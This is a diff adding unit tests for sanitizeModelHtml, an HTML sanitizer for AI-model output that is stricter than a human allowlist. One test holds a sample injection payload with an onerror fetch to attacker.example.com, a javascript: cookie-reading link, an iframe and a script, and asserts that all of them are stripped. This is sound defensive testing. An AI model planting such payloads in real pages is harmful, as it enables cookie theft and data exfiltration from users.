@@ -7,6 +7,12 @@ import {
   rateLimit,
   readSecret,
   rewriteCspStyleSrc,
+  ALLOWED_TAGS,
+  ATTR_ALLOW,
+  MODEL_ALLOWED_TAGS,
+  MODEL_ATTR_ALLOW,
+  MODEL_LINK_REL,
+  sanitizeModelHtml,
   sanitizeRichHtml,
   type KVLike,
   type RateLimiterBinding,
@@ -198,6 +204,89 @@ describe("sanitizeRichHtml", () => {
       expect(out).toContain('src="https://cdn.example/x.png"');
       expect(out).toContain("<img");
     });
+  });
+});
+
+describe("sanitizeModelHtml", () => {
+  // The invariant the preset rests on (#465): the model allowlist is a subset of
+  // the human one, so the two can't drift apart in the wrong direction.
+  it("allows only tags the human preset also allows", () => {
+    for (const tag of MODEL_ALLOWED_TAGS) expect(ALLOWED_TAGS).toContain(tag);
+  });
+
+  it("allows only attributes the human preset also allows, per tag", () => {
+    for (const [tag, attrs] of Object.entries(MODEL_ATTR_ALLOW)) {
+      expect(MODEL_ALLOWED_TAGS).toContain(tag);
+      for (const attr of attrs) expect(ATTR_ALLOW[tag]?.has(attr)).toBe(true);
+    }
+  });
+
+  it("is strictly narrower than the human preset", () => {
+    for (const tag of ["img", "span", "div", "section", "figure"]) {
+      expect(ALLOWED_TAGS).toContain(tag);
+      expect(MODEL_ALLOWED_TAGS).not.toContain(tag);
+    }
+  });
+
+  it("strips a prompt-injection payload and keeps the text structure", () => {
+    const payload =
+      "<h2>Summary</h2>" +
+      '<p style="color: red" class="btn-solid">Read <strong>this</strong> ' +
+      '<img src="https://tracker.example.com/p.gif" onerror="fetch(\'https://attacker.example.com\')">' +
+      '<a href="javascript:alert(document.cookie)">now</a> or ' +
+      '<a href="https://example.com/docs" target="_blank" rel="opener" onclick="x()">docs</a></p>' +
+      '<iframe src="https://attacker.example.com/frame"></iframe>' +
+      "<style>body{display:none}</style>" +
+      "<script>alert(1)</script>" +
+      "<ul><li>one</li><li><em>two</em></li></ul>" +
+      "<blockquote><p>quoted <code>x</code></p></blockquote>";
+    const out = sanitizeModelHtml(payload);
+
+    expect(out).not.toMatch(
+      /<img|onerror|tracker|javascript:|<iframe|attacker|<style|display:none|<script|alert|onclick|target=|btn-solid|class=|style=/i,
+    );
+    expect(out).toContain("<h2>Summary</h2>");
+    expect(out).toContain("<strong>this</strong>");
+    expect(out).toContain("<ul><li>one</li><li><em>two</em></li></ul>");
+    expect(out).toContain("<blockquote><p>quoted <code>x</code></p></blockquote>");
+    // The javascript: link is unwrapped to its text, not deleted with it.
+    expect(out).toContain("now");
+    expect(out).toContain(`<a href="https://example.com/docs" rel="${MODEL_LINK_REL}">docs</a>`);
+  });
+
+  it("forces rel on every surviving link, overriding what the model wrote", () => {
+    const out = sanitizeModelHtml('<p><a href="mailto:alex@example.com" rel="opener">Alex</a></p>');
+    expect(out).toBe(
+      `<p><a href="mailto:alex@example.com" rel="noopener noreferrer nofollow">Alex</a></p>`,
+    );
+  });
+
+  it("unwraps a link whose href isn't absolute HTTP, HTTPS, or mailto", () => {
+    for (const href of ["/contact", "#top", "./page", "data:text/html,x", "  javascript:x"]) {
+      expect(sanitizeModelHtml(`<p><a href="${href}">go</a></p>`)).toBe("<p>go</p>");
+    }
+    expect(sanitizeModelHtml("<p><a>bare</a></p>")).toBe("<p>bare</p>");
+  });
+
+  it("unwraps human-only wrappers but keeps their text", () => {
+    const out = sanitizeModelHtml(
+      '<div class="pb-grid"><p><span style="color: red">kept</span> <u>under</u></p></div>',
+    );
+    expect(out).toBe("<p>kept under</p>");
+  });
+
+  it("drops an image even inside an unwrapped wrapper", () => {
+    const out = sanitizeModelHtml(
+      '<figure><img src="https://example.com/x.png" onerror="y()"><figcaption>cap</figcaption></figure>',
+    );
+    expect(out).toBe("cap");
+  });
+
+  it("drops embeds with their contents", () => {
+    const out = sanitizeModelHtml(
+      '<p>a</p><object data="x"><embed src="y"></object><svg><script>z()</script></svg><p>b</p>',
+    );
+    expect(out).toBe("<p>a</p><p>b</p>");
   });
 });
 
